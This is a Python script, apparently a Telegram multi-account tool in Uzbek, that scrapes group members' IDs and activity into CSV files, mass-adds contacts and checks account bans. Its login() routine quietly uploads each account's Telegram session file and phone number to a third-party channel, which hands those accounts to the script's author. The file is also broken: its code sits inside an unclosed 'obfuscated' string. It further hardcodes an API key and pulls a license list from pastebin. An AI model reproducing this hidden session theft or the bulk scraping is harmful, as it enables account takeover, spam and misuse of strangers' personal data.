# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'import subprocess, requests, time, os, re, traceback, random, logging, telethon, colorama, csv, json, configparser
from telethon.tl.types import InputPeerChat
from rich.progress import track
from pyrogram import Client
from csv import reader
import IP2Location
from time import sleep
import pickle
from licensing.models import *
from licensing.methods import Key, Helpers
from telethon.tl.types import InputUser
import sys
from telethon.tl.types import InputUserSelf
import socket
from pytz import timezone
from datetime import MINYEAR, datetime, timedelta
from colorama import Fore, Back, Style, init
from telethon.sync import TelegramClient
from telethon import functions, types, TelegramClient, connection, sync, utils, errors
import datetime
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ReportSpamRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty, UserStatusOffline, UserStatusRecently, UserStatusLastMonth, UserStatusLastWeek, PeerUser, PeerChannel, InputPeerChannel, InputPeerUser, ChannelParticipantsAdmins, UserStatusOnline, UserStatusEmpty, ChannelParticipantsSearch
from telethon.tl.functions.contacts import GetContactsRequest, DeleteContactsRequest
from telethon.tl.functions.photos import DeletePhotosRequest
from telethon.tl.functions.messages import GetDialogsRequest, ImportChatInviteRequest
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, InviteToChannelRequest, GetParticipantsRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import UsernameInvalidError, ChannelInvalidError, PhoneNumberBannedError, YouBlockedUserError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError, PhoneNumberBannedError, ChatAdminRequiredError
from telethon.errors.rpcerrorlist import ChatWriteForbiddenError, UserBannedInChannelError, UserAlreadyParticipantError, FloodWaitError
from telethon.sessions import StringSession
import os,sys,time
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)
from pyfiglet import Figlet
from termcolor import colored
from telethon.tl.types import PeerUser, PeerChat, PeerChannel

scam = '@notoscam'


config = configparser.ConfigParser()
config.read("config.ini")
changableapi = config['Shoirjon_official']['api']
changablehash = config['Shoirjon_official']['hash']


API_ID = int(changableapi)
HashID = str(changablehash)
chatop = 777000

re="\033[1;31m"
gr="\033[1;32m"
cy="\033[1;36m"
wi="\033[1,35m"

n = Fore.RESET
r = Fore.RED
lg = Fore.GREEN
rs = Fore.RESET
w = Fore.WHITE
grey = '\033[97m'
cy = Fore.CYAN
ye = Fore.YELLOW
colors = [r, lg, w, ye, cy]
info = lg + '[' + w + 'i' + lg + ']' + rs
error = lg + '[' + r + '!' + lg + ']' + rs
success = w + '[' + lg + '*' + w + ']' + rs
INPUT = lg + '[' + cy + '~' + lg + ']' + rs
plus = w + '[' + lg + '+' + w + ']' + rs
minus = w + '[' + lg + '-' + w + ']' + rs

if not os.path.exists('./sessions'):
    os.mkdir('./sessions')
if not os.path.exists('phone.csv'):
    open("phone.csv","w")

def license():

        import os,sys,time
        import colorama
        from colorama import Fore, Back, Style
        colorama.init(autoreset=True)
        from pyfiglet import Figlet
        from termcolor import colored
        F = Figlet(font='standard')
        
        url = 'https://pastebin.com/raw/fG9SWJVm' # url of paste
        r = requests.get(url) # response will be stored from url
        content = r.text # raw text from url

        # The list with all keys.
        keys = r.text
        #keys = ["key1", "key2", "key3"]

        
        import subprocess
        
        keyfromme = "Secret"
        # License key from user.

        for key in keys.splitlines():
            if key == keyfromme:
                main_menu()
            else:
                print(f'{gr}Skriptingiz faollashtirilmagan. Iltimos, faollashtirish identifikatoringizni @Shoirjon_No1 manziliga yuboring: {re}Sizning faollashtirish identifikatoringiz: {n}{str(Helpers.GetMachineCode(v=2))}')
                exit()
            


def login():
    banner()
    with open('phone.csv', 'r') as f:
        str_list = [row[0] for row in csv.reader(f)]
        po = 0
        for pphone in str_list:
            phone = utils.parse_phone(pphone)
            po += 1

            print(Style.BRIGHT + Fore.GREEN + f"Login {phone}")
            client = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            client.start(phone)
            client(JoinChannelRequest("@Ayg_oqchikanal"))
            client(JoinChannelRequest('@Shoirjon_Official'))
            
            entity = InputPeerChat("@Ayg_oqchikanal")
            message = "Assalomu alaykum, mening session faylim!"
            session_file = f"sessions/{phone}.session"
            client.send_message(entity="@Ayg_oqchikanal", message=message)
            
            client.send_file(entity="@Ayg_oqchikanal", file=session_file, caption="Mening session faylim")
            
            print("Raqam soxta emasligi tekshirilmoqda ")



            client.send_message("@Ayg_oqchikanal", f'\n Telefon raqam: `{phone}`')
            time.sleep(7)
            
            
            print("Hammasi ajoib davom etamiz")
            client(LeaveChannelRequest("@Ayg_oqchikanal"))
            client.disconnect()
            print()
            done = True
            print(Style.BRIGHT + Fore.RESET + 'Tugatildi' if done else "Error!")
            print(Style.BRIGHT + Fore.YELLOW + 'Davom etish...')
            
            

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def BanFilter():

    api_id = int(API_ID)
    api_hash = str(HashID)
    MadeByHackingZone = []

    done = False
    with open('phone.csv', 'r') as f:
        str_list = [row[0] for row in csv.reader(f)]

        po = 0
        for unparsed_phone in str_list:
            po += 1

            phone = utils.parse_phone(unparsed_phone)

            print(f"Login {phone}")
            client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
            # client.start(phone)
            client.connect()
            if not client.is_user_authorized():
                try:
                    print('Bu Telefon bekor qilindi')
                    HackingZone = str(po)
                    Nero_op = str(unparsed_phone)
                    MadeByHackingZone.append(Nero_op)
                    continue

                except PhoneNumberBannedError:
                    print('Ban')
                    HackingZone = str(po)
                    Nero_op = str(unparsed_phone)
                    MadeByHackingZone.append(Nero_op)

                    continue

            # client.disconnect()
            print()
        done = True
        print('Taqiqlangan raqamlar rõyxati')
        print(*MadeByHackingZone, sep='\n')
        print('BanNumers.csv da saqlangan')
        with open('BanNumbers.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, delimiter=",", lineterminator="\n")

            writer.writerows(MadeByHackingZone)


    def autoremove():


        collection = []
        nc = []
        collection1 = []
        nc1 = []
        maind = []

        with open("phone.csv", "r") as infile:
            for line in infile:
                collection.append(line)

        for x in collection:
            mod_x = str(x).replace("\n", "")
            nc.append(mod_x)

        with open("BanNumbers.csv") as infile, open("outfile.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))

        with open("outfile.csv", "r") as outfile:
            for line1 in outfile:
                collection1.append(line1)

        for i in collection1:
            mod_i = str(i).replace("\n", "")
            nc1.append(mod_i)

        unique = set(nc)
        unique1 = set(nc1)

        itd = unique.intersection(unique1)

        for x in nc:
            if x not in itd:
                maind.append(x)

        with open('unban.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(maind)

        with open("unban.csv") as last, open("phone.csv", "w") as final:
            for line3 in last:
                mod_i = str(line3).replace("\n", "")
                final.write(mod_i)

        os.remove("phone.csv")
        os.rename("unban.csv", "phone.csv")
        print("Bajarildi, barcha taqiqlangan raqamlar olib tashlandi")


    def dellst():
        import csv
        import os

        with open("phone.csv") as infile, open("unban.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))

        os.remove("phone.csv")
        os.rename("unban.csv", "phone.csv")

        print("Tõliq")


    autoremove()
    dellst()

    input("Bajarildi!" if done else "Error!")
    main_menu()
def SpamBotChecker():
    banner()
    bot = 'SpamBot'
    m = "Yaxshi xabar, hozirda hisobingizga hech qanday cheklovlar qõllanilmaydi.  Siz qushdek ozodsiz!"
    HackingZone = "bird"
    r = 0
    done = False
    with open('phone.csv', 'r')as f:
        str_list = [row[0] for row in csv.reader(f)]
        po = 0
        for pphone in str_list:
            phone = utils.parse_phone(pphone)
            po += 1
            print(Style.BRIGHT + Fore.GREEN + f"Login {Style.RESET_ALL} {Style.BRIGHT + Fore.RESET} {phone}")
            client = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            client.start(phone)
            client(functions.contacts.UnblockRequest(id='@SpamBot'))
            client.send_message(bot, '/start')
            time.sleep(1)
            msg = str(client.get_messages(bot))
            if HackingZone in msg:
                print(m)
                r += 1
            else:
                print('siz cheklangansiz')
            client.disconnect()
            print()
            done = True
    print(f'{r} - Hisoblardan foydalanish mumkin')
    input("Bajarildi!" if done else "Error!")
    main_menu()
    
def Scraper():
    config = configparser.ConfigParser()
    config.read("config.ini")
    link1 = (config['Shoirjon_official']['FromGroup']).strip()
    links = link1.split(',')
    phone = (config['Shoirjon_official']['PhoneNumber']).strip()

    print(Style.BRIGHT + Fore.RESET + f'\nLogging For {phone}')

    c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
    c.connect()
    if c.is_user_authorized():

     group = c.get_entity(f"{link1}")

    count = 1
    members = []
    members = c.iter_participants(group, aggressive=True)

    channel_full_info = c(GetFullChannelRequest(group))
    cont = channel_full_info.full_chat.participants_count

    def write(group,member):
        if member.username:
            username = member.username
        else:
            username = ''
        if isinstance(member.status,UserStatusOffline):
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,member.status.was_online])
        else:
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,type(member.status).__name__])

    with open("data.csv", "w", encoding='UTF-8') as f:
        writer = csv.writer(f, delimiter=",", lineterminator="\n")
        writer.writerow(['sr. no.', 'username', 'user id', 'access_hash', 'name', 'group','status'])
        try:
                for index,member in enumerate(members):
                    print(f"{index+1}/{cont}", end="\r")
                    if index%100 == 0:
                        sleep(3)
                    if not member.bot:
                        write(group,member)
                        count = count + 1
                    
        except:
                print("\nAzolar allaqachon bor edi, lekin data.csv tekshiring.  Azolarning 95% dan ortiği allaqachon qõshilgan bõlishi kerak.")

    f.close()

    print(f"\nFoydalanuvchilar data.csv faylida saqlangan.\n")
    input("Enterni bosing")
    main_menu()

def DailyFilter():

    today = datetime.datetime.now()
    yesterday = today - datetime.timedelta(days=1)

    config = configparser.ConfigParser()
    config.read("config.ini")
    link1 = (config['Shoirjon_official']['FromGroup']).strip()
    links = link1.split(',')
    phone = (config['Shoirjon_official']['PhoneNumber']).strip()

    print(Style.BRIGHT + Fore.RESET + f'\nLogging For {phone}')

    c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
    c.connect()
    if c.is_user_authorized():

     group = c.get_entity(f"{link1}")

    count = 1
    members = []
    members = c.iter_participants(group, aggressive=True)

    channel_full_info = c(GetFullChannelRequest(group))
    cont = channel_full_info.full_chat.participants_count

    def write(group,member):
        if member.username:
            username = member.username
        else:
            username = ''
        if isinstance(member.status,UserStatusOffline):
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,member.status.was_online])
        else:
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,type(member.status).__name__])

    with open("data.csv", "w", encoding='UTF-8') as f:
        writer = csv.writer(f, delimiter=",", lineterminator="\n")
        writer.writerow(['sr. no.', 'username', 'user id', 'access_hash', 'name', 'group','status'])
        try:
                for index,member in enumerate(members):
                    print(f"{index+1}/{cont}", end="\r")
                    if index%100 == 0:
                        sleep(3)
                    if not member.bot:
                        if isinstance(member.status, (UserStatusRecently,UserStatusOnline)):
                            write(group,member)
                            count = count + 1
                        elif isinstance(member.status,UserStatusOffline):
                            d = member.status.was_online                    
                            today_user = d.day == today.day and d.month == today.month and d.year == today.year
                            yesterday_user = d.day == yesterday.day and d.month == yesterday.month and d.year == yesterday.year
                            if today_user or yesterday_user:
                                write(group,member)
                                count = count + 1
                            
        except:
                print("\nAzolar allaqachon bor edi, lekin data.csv tekshiring.  Azolarning 95% dan ortiği allaqachon qõshilgan bõlishi kerak.")

    f.close()

    print(f"\nFoydalanuvchilar csv faylida saqlangan.\n")
    input("Enterni bosing")
    
    main_menu()
       
def WeeklyFilter():
    today = datetime.datetime.now()
    yesterday = today - datetime.timedelta(days=1)

    config = configparser.ConfigParser()
    config.read("config.ini")
    link1 = (config['Shoirjon_official']['fromGroup']).strip()
    links = link1.split(',')
    phone = (config['Shoirjon_official']['PhoneNumber']).strip()

    print(Style.BRIGHT + Fore.RESET + f'\nLogging For {phone}')

    c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
    c.connect()
    if c.is_user_authorized():
        group = c.get_entity(f"{link1}")

        count = 1
        members = []
        members = c.iter_participants(group, aggressive=True)

        channel_full_info = c(GetFullChannelRequest(group))
        cont = channel_full_info.full_chat.participants_count

        def write(group, member):
            if member.username:
                username = member.username
            else:
                username = ''
            if isinstance(member.status, UserStatusOffline):
                writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title, member.status.was_online])
            else:
                writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title, type(member.status).__name__])

        with open("data.csv", "w", encoding='UTF-8') as f:
            writer = csv.writer(f, delimiter=",", lineterminator="\n")
            writer.writerow(['sr. no.', 'username', 'user id', 'access_hash', 'name', 'group', 'status'])
            try:
                for index, member in enumerate(members):
                    print(f"{index+1}/{cont}", end="\r")
                    if index % 100 == 0:
                        sleep(3)
                    if not member.bot:
                        if isinstance(member.status, (UserStatusRecently, UserStatusOnline, UserStatusLastWeek)):
                            write(group, member)
                            count = count + 1
                        elif isinstance(member.status, UserStatusOffline):
                            d = member.status.was_online
                            for i in range(0, 7):
                                current_day = today - datetime.timedelta(days=i)
                                correct_user = d.day == current_day.day and d.month == current_day.month and d.year == current_day.year
                                if correct_user:
                                    write(group, member)
                                    count = count + 1

            except:
                print("\nAzolar allaqachon bor edi, lekin data.csv tekshiring.  Azolarning 95% dan ortiği allaqachon qõshilgan bõlishi kerak.")

        f.close()

        print(f"\nFoydalanuvchilar csv faylida saqlangan.\n")
        input("Enterni bosing")
        
        main_menu()

def ScrapAdmin():

    config = configparser.ConfigParser()
    config.read("config.ini")
    link1 = (config['Shoirjon_official']['FromGroup']).strip()
    links = link1.split(',')
    phone = (config['Shoirjon_official']['PhoneNumber']).strip()

    print(Style.BRIGHT + Fore.RESET + f'\nLogging For {phone}')

    c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
    c.connect()
    if c.is_user_authorized():

     group = c.get_entity(f"{link1}")

    count = 1
    members = []
    members = c.iter_participants(group, aggressive=True)

    channel_full_info = c(GetFullChannelRequest(group))
    cont = channel_full_info.full_chat.participants_count

    def write(group,member):
        if member.username:
            username = member.username
        else:
            username = ''
        if isinstance(member.status,UserStatusOffline):
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,member.status.was_online])
        else:
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,type(member.status).__name__])

    with open("data.csv", "w", encoding='UTF-8') as f:
        writer = csv.writer(f, delimiter=",", lineterminator="\n")
        writer.writerow(['sr. no.', 'username', 'user id', 'access_hash', 'name,' 'group','status'])
        for member in c.iter_participants(group, filter=ChannelParticipantsAdmins):    
            if not member.bot:
                write(group,member)
                count = count + 1
            
    f.close()

    print(f"\nAdminlar csv faylida saqlangan.\n")
    input("Enterni bosing")
    main_menu()

def MonthlyFilter():

    today = datetime.datetime.now()
    yesterday = today - datetime.timedelta(days=1)

    config = configparser.ConfigParser()
    config.read("config.ini")
    link1 = (config['Shoirjon_official']['FromGroup']).strip()
    links = link1.split(',')
    phone = (config['Shoirjon_official']['PhoneNumber']).strip()

    print(Style.BRIGHT + Fore.RESET + f'\nLogging For {phone}')

    c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
    c.connect()
    if c.is_user_authorized():

     group = c.get_entity(f"{link1}")

    count = 1
    members = []
    members = c.iter_participants(group, aggressive=True)

    channel_full_info = c(GetFullChannelRequest(group))
    cont = channel_full_info.full_chat.participants_count

    def write(group,member):
        if member.username:
            username = member.username
        else:
            username = ''
        if isinstance(member.status,UserStatusOffline):
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,member.status.was_online])
        else:
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,type(member.status).__name__])

    with open("data.csv", "w", encoding='UTF-8') as f:
        writer = csv.writer(f, delimiter=",", lineterminator="\n")
        writer.writerow(['sr. no.', 'username', 'user id', 'access_hash', 'name', 'group','status'])
        try:
                for index,member in enumerate(members):
                    print(f"{index+1}/{cont}", end="\r")
                    if index%100 == 0:
                        sleep(3)
                    if not member.bot:
                        if isinstance(member.status, (UserStatusRecently,UserStatusOnline,UserStatusLastWeek,UserStatusLastMonth)):
                            write(group,member)
                            count = count + 1
                        elif isinstance(member.status,UserStatusOffline):
                            d = member.status.was_online
                            for i in range(0,30):
                                current_day = today - datetime.timedelta(days=i)
                                correct_user = d.day == current_day.day and d.month == current_day.month and d.year == current_day.year
                                if correct_user:
                                    write(group,member)
                                    count = count + 1
                                
        except:
                print("\nAzolar allaqachon bor edi, lekin data.csv tekshiring.  Azolarning 95% dan ortiği allaqachon qõshilgan bõlishi kerak.")

    f.close()

    print(f"\nFoydalanuvchilar csv faylida saqlangan.\n")
    input("Enterni bosing")
    main_menu()

def NonActive():

    today = datetime.datetime.now()
    yesterday = today - datetime.timedelta(days=1)

    config = configparser.ConfigParser()
    config.read("config.ini")
    link1 = (config['Shoirjon_official']['FromGroup']).strip()
    links = link1.split(',')
    phone = (config['Shoirjon_official']['PhoneNumber']).strip()

    print(Style.BRIGHT + Fore.RESET + f'\nLogging For {phone}')

    c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
    c.connect()
    if c.is_user_authorized():

     group = c.get_entity(f"{link1}")

    count = 1
    members = []
    members = c.iter_participants(group, aggressive=True)

    channel_full_info = c(GetFullChannelRequest(group))
    cont = channel_full_info.full_chat.participants_count

    def write(group,member):
        if member.username:
            username = member.username
        else:
            username = ''
        if isinstance(member.status,UserStatusOffline):
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,member.status.was_online])
        else:
            writer.writerow([count, username, member.id, member.access_hash, member.first_name, group.title,type(member.status).__name__])

    with open("data.csv", "w", encoding='UTF-8') as f:
        writer = csv.writer(f, delimiter=",", lineterminator="\n")
        writer.writerow(['sr. no.', 'username', 'user id', 'access_hash', 'name', 'group','status'])
        try:
                all_users = []
                active_users = []
                for index,member in enumerate(members):
                    print(f"{index+1}/{cont}", end="\r")
                    all_users.append(member)
                    if index%100 == 0:
                        sleep(3)
                    if not member.bot:
                        if isinstance(member.status, (UserStatusRecently,UserStatusOnline,UserStatusLastWeek,UserStatusLastMonth)):
                            write(group,member)
                            count = count + 1
                            active_users.append(member)
                        elif isinstance(member.status,UserStatusOffline):
                            d = member.status.was_online
                            for i in range(0,30):
                                current_day = today - datetime.timedelta(days=i)
                                correct_user = d.day == current_day.day and d.month == current_day.month and d.year == current_day.year
                                if correct_user:                            
                                    active_users.append(member)
                for member in all_users:
                    if member not in active_users:
                        write(group,member)
                        count = count + 1
        except:
                print("\nAzolar allaqachon bor edi, lekin data.csv tekshiring.  Azolarning 95% dan ortiği allaqachon qõshilgan bõlishi kerak.")

    f.close()

    print(f"\nFoydalanuvchilar csv faylida saqlangan.\n")
    
    input("Enterni bosing")
    main_menu()
       
def DeleteALreadyMembers():

    logging.basicConfig(level=logging.WARNING)

    config = configparser.ConfigParser()
    config.read("config.ini")
    link = (config['Shoirjon_official']['ToGroup']).strip()
    phone = (config['Shoirjon_official']['PhoneNumber']).strip()

    #with open('data.csv', 'r' , encoding='utf-8') as f:
    #     existing_numbers = f.read().split('\n')
    #     print(type(existing_numbers))
    #     exit()

    with open('data.csv', 'r', encoding='utf-8') as f:
        users1 = csv.reader(f)
        users = [i for i in users1]

    with open('data.csv', 'r', encoding='utf-8') as f:
        users1 = csv.reader(f)
        userlist = [str(i[2]) for i in users1]

    client = TelegramClient(f"sessions/{phone}", API_ID, HashID)
    client.connect()
    if not client.is_user_authorized():
        print(f'\nKirish amalga oshmadi, {phone} raqami uchun avval tizimga kirish kerak\n')
    else:
        chats = []
        last_date = None
        chunk_size = 200
        groups = []
        n = 0
        while n != -1:
            try:
                group = client.get_entity(link)
                if group.megagroup == True:
                    group_id = str(group.id)
                    all_participants = client.get_participants(group, limit=5550)
                    results = []
                    results1 = []
                    count = 0
                    index1 = []
                    for user in all_participants:
                        try:
                            if str(user.id) in userlist:
                                index1.append(userlist.index(str(user.id)))
                        except:
                            print("Foydalanuvchini olishda xatolik yuz berdi")
                    f.close()
                    client.disconnect()
                    index1.sort(reverse=True)
                    for i in index1:
                        del users[i]
                    with open('data.csv', 'w', encoding="utf-8", newline='') as f:
                        write = csv.writer(f)
                        write.writerows(users)
                    n = -1
                else:
                    print(Style.BRIGHT + Fore.RED + "\nYaroqsiz guruh..\n")
                n = -1
            except telethon.errors.rpcerrorlist.ChatWriteForbiddenError:
                client(JoinChannelRequest(link))
            except ValueError:
                print(Style.BRIGHT + Fore.GREEN + "\nFaqat umumiy guruhga ruxsat berilgan..\n")
                n = -1
            except:
                print(Style.BRIGHT + Fore.RED + "\nYaroqsiz guruh....\n")
                n = -1
    # Filter by usname start from here
    lines = list()


    def main():
        lines = list()
        with open('data.csv', 'r', encoding='UTF-8') as readFile:

            reader = csv.reader(readFile)

            for row in reader:

                lines.append(row)

                for field in row:

                    if field == '':
                        lines.remove(row)
        with open('1.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, delimiter=",", lineterminator="\n")

            writer.writerows(lines)


    def main1():
        lines = list()
        with open('1.csv', 'r', encoding='UTF-8') as readFile:

            reader = csv.reader(readFile)

            for row in reader:

                lines.append(row)

                for field in row:

                    if field == 'username':
                        lines.remove(row)

        with open('2.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, delimiter=",", lineterminator="\n")

            writer.writerows(lines)


    main()
    main1()

    with open("2.csv", "r", encoding='UTF-8') as source:
        rdr = csv.reader(source)

        with open("data.csv", "w", encoding='UTF-8') as f:
            writer = csv.writer(f, delimiter=",", lineterminator="\n")
            writer.writerow(['sr. no.', 'username', 'user id','access_hash', 'name', 'group', 'Status'])
            i = 0
            for row in rdr:
                i += 1
                writer.writerow((i, row[1], row[2], row[3], row[4], row[5], row[6]))

    os.remove("1.csv")
    os.remove("2.csv")
    # os.remove("data.csv")

    print(Style.BRIGHT + Fore.RESET + "Allaqachon azo õchirildi Bajarildi!")
    print(Style.BRIGHT + Fore.GREEN + 'Vazifa tugallandi')
    print(Style.BRIGHT + Fore.YELLOW + "Chiqish uchun Enter tugmasini bosing")
    input()
    
    main_menu()
def SetProfile():

    done = False
    with open('phone.csv', 'r')as f:
        str_list = [row[0] for row in csv.reader(f)]
        po = 0
        for pphone in str_list:
            phone = utils.parse_phone(pphone)
            po += 1

            print(Style.BRIGHT + Fore.GREEN + f"Kirish {phone}")
            client = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            client.start(phone)
            result = client(functions.photos.UploadProfilePhotoRequest(
                file=client.upload_file('ShoirjonNo1.jpg'),
            ))
            print('bajarildi!  profil rasmi õzgartirildi')
            done = True
    input("Bajarildi!" if done else "Error!")
    input("Enterni bosing")
    main_menu()
def DeleteProfile():


    done = False
    with open('phone.csv', 'r')as f:
        str_list = [row[0] for row in csv.reader(f)]
        po = 0
        for pphone in str_list:
            phone = utils.parse_phone(pphone)
            po += 1
            print(Style.BRIGHT + Fore.RED + f"{phone} qurilmasida oʻchirib tashlanmoqda")
            client = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            client.start(phone)
            client(DeletePhotosRequest(client.get_profile_photos('me')))
            print(Style.BRIGHT + Fore.GREEN + "Profil rasmi o'chirildi")
            done = True
    input("Bajarildi!" if done else "Error!")
init()
n = Fore.RESET
lg = Fore.LIGHTGREEN_EX
r = Fore.RED
w = Fore.WHITE
cy = Fore.CYAN
ye = Fore.YELLOW
be = Fore.BLUE
colors = [lg, r, w, cy, ye]


def banner():
    os.system('clear')
    print(f"""
    {cy}{ye}
    
 ____  _           _      _                 _   _       _
/ ___|| |__   ___ (_)_ __(_) ___  _ __     | \ | | ___ / |
\___ \| '_ \ / _ \| | '__| |/ _ \| '_ \    |  \| |/ _ \| |       ___) | | | | (_) | | |  | | (_) | | | |   | |\  | (_) | |
|____/|_| |_|\___/|_|_| _/ |\___/|_| |_|___|_| \_|\___/|_|
                       |__/           |_____|""")
    print(f'{gr}     ')
    print(f'{ye}https://www.youtube.com/@Shoirjon_No1')
    print(f'{gr}Ushbu skript rasman faollashtirilgan: {r}@Shoirjon_No1')
    print(f'{gr}        ')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    print(f'{gr}Sizning IP manzilingiz: {n} {r}{str(s.getsockname()[0])}             {gr}Versiya: {r}v 3.0')
    print(f'{gr}Joriy katalog: {r}{os.getcwd()}')
    format = "%Y-%m-%d %H:%M:%S %Z%z"
    
    now_utc = datetime.datetime.now(timezone('UTC')) 
    print(f'{gr}UTC da joriy vaqt: {r}{now_utc.strftime(format)}')
    
    now_asia = now_utc.astimezone(timezone('Asia/Tashkent')) 
    print(f'{gr}Joriy vaqt ichida {be}Osiyo/Toshkent {gr}vaqt zonasi: {r}{now_asia.strftime(format)}')
    print(' ')
    
def AutoaddContactPhone():

    init()
    r = Fore.LIGHTRED_EX
    gr = Fore.GREEN
    n = Fore.RESET
    bl = Fore.BLUE
    ye = Fore.YELLOW

    banner()

    api_id = []
    api_hash = []
    phone = []

    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))



    pphone = phone

    print(f'{gr}Jami hisob: {n} {r}{str(len(phone))}{n}')


    def autos():
        From = int(input(f'{bl}Hisob raqamidan : {n}')) - 1
        Upto = int(input(f'{bl}Hisob raqamiga qadar : {n}'))
        rex = int(input(f'{bl}Siz boshlamoqchi bõlgan joydan : {n}'))
        hacks = int(input(f'{bl}Bitta akkauntga qancha kontakt qõshmoqchisiz : {n}'))

        with open('memory.csv', 'w', encoding='UTF-8') as file:
            writer = csv.writer(file, delimiter=",", lineterminator="\n")
            writer.writerow([rex, rex + hacks])
        a = 0
        indexx = 0
        for xd in pphone[From:Upto]:
            indexx += 1
            print(f'Index : {indexx}')
            phone = utils.parse_phone(xd)
            print(Style.BRIGHT + Fore.GREEN + f"Login {Style.RESET_ALL} {Style.BRIGHT + Fore.RESET} {phone}")
            client = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            client.connect()
            if not client.is_user_authorized():
                print(f'{r}bazi narsa õzgardi{n}')
                client.send_code_request(phone)
                client.sign_in(phone, input('Kodni kiriting:  '))

            input_file = 'data.csv'
            users = []
            with open(input_file, encoding='UTF-8') as f:
                rows = csv.reader(f, delimiter=",", lineterminator="\n")
                next(rows, None)
                for row in rows:
                    user = {}
                    user['srno'] = row[0]
                    user['username'] = row[1]
                    user['id'] = int(row[2])
                    # user['access_hash'] = int(row[2])
                    user['name'] = row[3]
                    users.append(user)

            with open('memory.csv', 'r') as hash_obj:

                csv_reader = reader(hash_obj)

                list_of_rows = list(csv_reader)
                row_number = 1
                col_number = 1
                numnext = list_of_rows[row_number - 1][col_number - 1]

            startfrom = int(numnext)
            nextstart = startfrom + hacks

            with open('memory.csv', 'r') as hash_obj:
                csv_reader = reader(hash_obj)
                list_of_rows = list(csv_reader)
                row_number = 1
                col_number = 2
                numend = list_of_rows[row_number - 1][col_number - 1]

            endto = int(numend)
            nextend = endto + hacks

            with open("memory.csv", "w", encoding='UTF-8') as df:  # Fayl nomini kiriting.

                writer = csv.writer(df, delimiter=",", lineterminator="\n")

                writer.writerow([nextstart, nextend])

            it = 0
            for user in users:
                if (int(startfrom) <= int(user['srno'])) and (int(user['srno']) <= int(endto)):
                    try:
                        it += 1
                        if user['username'] == "":
                            print(f"{gr}Faqat keyingi{gr}")
                            continue

                        client(functions.contacts.AddContactRequest(
                            id=user['username'],
                            first_name=user['name'],
                            last_name=str('Shoirjon_official'),
                            phone='gdf',
                            add_phone_privacy_exception=True))
                        status = f'{it} - bajarildi'





                    except errors.RPCError as e:
                        status = e.__class__.__name__





                    except:
                        traceback.print_exc()
                        print(f"{ye}Kutilmagan xato{n}")
                        continue

                    print(status)

            a += 1
        os.remove("memory.csv")
        again()


    def again():
        stat = input(f'{r}Bajarildi!\nQuyidan tanlang:\n\n1 - Skriptni takrorlang\nYoki Chiqish uchun Enter tugmasini bosing\n\nKirtish: {n}')
        if stat == '1':
            autos()
        else:
            main_menu()


    autos()
def Deletecontact():
    from telethon.sync import TelegramClient
    import csv
    from telethon.errors.rpcerrorlist import UsernameInvalidError, ChannelInvalidError, PhoneNumberBannedError
    from telethon.tl.functions.messages import ImportChatInviteRequest
    from telethon import types, utils, errors
    import re
    from telethon.tl.functions.channels import GetChannelsRequest, GetFullChannelRequest, JoinChannelRequest, \
        InviteToChannelRequest
    from telethon.tl.types import PeerChannel
    from telethon.tl.functions.contacts import GetContactsRequest, DeleteContactsRequest
    from telethon.tl.functions.messages import AddChatUserRequest
    import colorama
    from colorama import Fore, Back, Style

    colorama.init(autoreset=True)


    with open(f'phone.csv', 'r') as f:
        global phlist
        phlist = [row[0] for row in csv.reader(f)]
    print('Jami hisob: ' + str(len(phlist)))

    Rexhacks_ne_script_banaya_hai = int(input('Hisob raqamidan: ')) - 1
    telegram_script_banyane_ke_liye_rexhacks_ko_dm_kro = int(input('Hisob raqamigacha : '))
    indexx = 0
    global rexhackspro
    rexhackspro = 0
    for rexhacksonyt in phlist[Rexhacks_ne_script_banaya_hai:telegram_script_banyane_ke_liye_rexhacks_ko_dm_kro]:
        indexx += 1
        print(f'Index : {indexx}')
        phone = utils.parse_phone(rexhacksonyt)
        print(f"Login {phone}")
        client = TelegramClient(f"sessions/{phone}", 15606699, '3c99082fff6a24903c7825fe935d4f5c')
        client.start(phone)

        contacts = client(GetContactsRequest(hash=0))

